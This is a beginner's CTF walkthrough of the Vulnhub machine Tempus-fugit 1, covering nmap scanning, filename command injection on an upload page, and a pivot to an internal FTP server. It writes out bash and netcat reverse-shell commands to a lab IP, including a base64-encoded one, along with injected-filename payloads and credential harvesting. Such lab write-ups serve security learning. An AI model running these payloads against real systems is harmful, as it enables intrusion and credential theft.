# Tempus-fugit 1

This is the first time I am attempting a CTF. I've gone through walkthroughs of few CTFs before. The resources I follow are hackingarticles.in and [ippsec.rocks](https://ippsec.rocks/?#). The box can be downloaded from [vulnhub](https://www.vulnhub.com/entry/tempus-fugit-1,346/). This is a few months old box.


# Network Scanning

I've imported the .ova file using virtualbox and put both the kali vbox and the Tempus-fugit vbox (target) in the same NATNetwork. The ip target machine can be found using `netdiscover` tool. Since my kali has an ip of 10.0.2.12 and both are in the subnet 10.0.2.0/24, we can use the range parameter in netdiscover to easily find the ip `netdiscover -r 10.0.2.0/16`. From the list of ips found, we can identify the target machine. We can then use `nmap` to find what ports are open on the target machine (its 10.0.2.14 in my case)
```
nmap -sC -sV -oA nmap/nmap 10.0.2.14
# Nmap 7.70 scan initiated Mon Feb 24 02:38:03 2020 as: nmap -sC -sV -oA nmap/nmap 10.0.2.14
Nmap scan report for 10.0.2.14
Host is up (0.00014s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.15.3
|_http-server-header: nginx/1.15.3
|_http-title: Tempus Fugit
|_http-trane-info: Problem with XML parsing of /evox/about
MAC Address: 08:00:27:22:DA:48 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 24 02:38:11 2020 -- 1 IP address (1 host up) scanned in 8.01 seconds
```
# Enumeration
From nmap data, we can see that there is a nginx web server hosted on port 80 and we can connect to it using http. The site looks pretty simple. It has a main page and upload page. There is nothing interesting from the page source, except that it looks like a template. The stuff section of the page has many cards which pop up modals. Nothing interesting here.
![clicking the cards pop up these modals](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/stuff.png)
The about section mentions something about an ftp server where scripts can be uploaded. This might be out point of injection.
![about section of the page](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/about.png)
Next, the page has a contact us with multiple forms for name, mail, etc. But whatever the input is, the site responds with an error saying the mail server is not responding
![contactus](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/contactus.png)
The upload page has two buttons to browse and upload files. After selecting a file, the file name gets displayed on the page. So, we can try any XSS vectors here
![browse](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/browse.png)
after the files is uploaded, the contents of the file are displayed on the page. This is interesting, so i tried to check if it executes if there's a command inside a file. But it just shows the command instead.
![command](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/command.png)
Since its just showing the contents of file, the server might just be using `cat` on the file name to do this. If that's the case, we can append a command in the filename which gets executed after `cat`. To try this, I uploaded a file 'new3.txt;whoami'. Infact, we can append multiple commands seperated by ';'. This was successful and the command `whoami` gets executed and returns root
![whoami- root](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/whoami.png)
this can be used as a command injection point to spawn a reverse shell. The best way to iterate is using burp suite's repeater. Here are some observations from uploading files with various commands in the name:
* there are two requests during the upload- a POST request with filename parameter. The response to this is a session cookie from the server, which will be passed in the second request (GET). The response to this is a html with the command executed. In case of `ls` after filename, the output html has the following:
![ls](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/ls.png)
* the cookie changes everytime there is a new request
* only .txt and .rtf files can be uploaded. The server gives an error saying that only these types are accepted
* reverse shell can be created using bash - `bash -i >& /dev/tcp/10.0.2.12/9001 0<&1`, but unix doesn't allow filenames to have '/' in them. So we cannot use this. I've tried exporting command to an env variable and using it while creating a file, didn't help.
* But we don't have to create a file. Since its a parameter in the request, we can modify the request in burp repeater. But still this doesn't work and gives a 500 error![500 error](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/500.png)
* if there is any '.' in the command, server rejects it saying that its not a text file. So, we cannot add ip addresses in the command
* there are numerous ways to get a [reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), but all these methods need to have ip address in the command. 
* one way to eliminate the '.' and '/' is by encoding the command. `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTIvOTAwMSAwPiYxCg==` is the base64 encoded version of `bash -i >& /dev/tcp/10.0.2.12/9001 0<&1`. I created a file and with the name `“new.txt;echo ‘YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTIvOTAwMSAwPiYxCg==’ | base64 -d > revShell”`. The plan here is to create a file (revShell) in server and then execute it with the next file - `"new.txt;bash revShell"`.  And at the same time, use `nc` to start a listener on the same port (9001) on kali using `nc -lvnp 9001`. Unfortunately, this didn't work and i don't recall why.
* I tried the same process with `nc` based reverse shell (`nc -c bash 10.0.2.12 9001`) as well. This time, the session has established, but I was unable to run any commands and the server returned error *cannot connect to FTP-server*
![session established](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/session.png)
![FTP timeout](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/ftp-server.png)
* one more thing I wanted to try was appending another command to the filename, this time with a .txt extension. I used the filename "new.txt;nc 10.0.2.12 9001 -e bash; a.txt". This should work even though the last command `a.txt` doesn't make any sense. And it worked. This is the first time i got a reverse shell and i was too excited
![shell!! yay](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/firstshell.png)
- we can use `python -c 'import pty;pty.spawn("/bin/bash")'` to prettify the terminal
- I've also used `stty raw -echo` on the kali terminal so that I can use tabbing on this shell

The next step is to get the root flag, which is usually in /root. There's a message.txt file, but it says 'you are not done yet'
![damn!](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/message.png)
Since there are some files we found with `ls` command, lets examine the files.
* most of the files are pretty normal, js and htmls
* the interesting on is the main.py, which runs a flask app to serve the uploads page. All the checks in filenames we discovered so far are coming from this file.
* it also has the credentials of ftp server. We can use it later at some point
![ftp-creds](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/ftp-creds.png)
* to see what's going on the server, I ran [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh). It's an amazing tool which enumerates all the useful data on the machine.
* From the linenum output, we can see that we're inside a docker container. This makes sense as there was a docker message during target bootup
![docker](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/docker.png)
* there are few file in the root directory- there's another file *entrypoint.sh* which looks to be creating *nginx.conf* file. There's also a *start.sh* script which runs another script */app/prestart.sh*
* another interesting grab from linenum is the history files. *.python_history* has some interesting information
![enter image description here](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/pyhistory.png)
* the arp table from linenum shows few ips![enter image description here](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/arp.png)
* The FTP port should be open on one of these ips. We can check this using `nc -zv 172.19.0.100 21` command
![nc](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/nc-zv.png)
* since 172.19.0.12 has port 21 open, we can connect it using ftp. From the conf files linenum found, there are lftp files. So, server might be using lftp to connect to the FTP server. Using the credentials from main.py, I was able to login. Apart from all the files I earlier uploaded while getting reverse shell, there is a *cmscreds.txt* file which has some credentials
![cmscreds](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/cmscreds.png)
* linenum also shows *resolv.conf* which has interesting 
![resolv](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/resolv.png)

I spent a lot of time after this point but didn't find any leads. So, i looked up other walkthroughs where people used `add apk nmap` to install nmap and scan the ips for open ports.

